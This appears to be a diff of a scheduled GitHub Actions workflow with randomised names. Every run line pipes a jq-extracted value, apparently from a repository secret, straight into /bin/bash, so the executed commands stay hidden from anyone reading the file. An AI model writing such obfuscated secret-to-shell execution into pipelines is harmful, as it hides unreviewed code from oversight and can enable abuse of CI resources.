@@ -1,31 +1,24 @@
 name: circlechapter
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 4/6 * * *'
+    - cron: '23 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: circlechapter
         env:
-          xmgqs7048: ${{ secrets.xmgqs7048 }}
+          qib3164: ${{ secrets.qib3164 }}
         run: |
-          echo $xmgqs7048 | jq -r .hamwn86 | /bin/bash
-          echo $uee03 | jq -r .uq41038 | /bin/bash
-          echo $ct35 | jq -r .yn94 | /bin/bash
-          echo $hoddp01 | jq -r .cru4847 | /bin/bash
-          echo $j82083 | jq -r .cgb27645 | /bin/bash
-          echo $sma00 | jq -r .cmu78772 | /bin/bash
-          echo $kyhoo0 | jq -r .f6489 | /bin/bash
-          echo $qltes80671 | jq -r .nn88 | /bin/bash
-          echo $i677 | jq -r .y53484 | /bin/bash
-          echo $xrqnn53735 | jq -r .euscx0304 | /bin/bash
-          echo $jrwy475 | jq -r .kf22 | /bin/bash
-          echo $rbtz8316 | jq -r .cwo9137 | /bin/bash
-          echo $w412 | jq -r .iy96267 | /bin/bash
-          echo $elf2115 | jq -r .indto72297 | /bin/bash
-          echo $snotg2 | jq -r .gzn39 | /bin/bash
-          echo $lpmeo252 | jq -r .zuk96 | /bin/bash
+          echo $qib3164 | jq -r .gs883 | /bin/bash
+          echo $a02128 | jq -r .gqce65 | /bin/bash
+          echo $dvoib3923 | jq -r .ex365 | /bin/bash
+          echo $r3 | jq -r .gwwpq94674 | /bin/bash
+          echo $jmpn47367 | jq -r .x8171 | /bin/bash
+          echo $ttf8213 | jq -r .c82 | /bin/bash
 
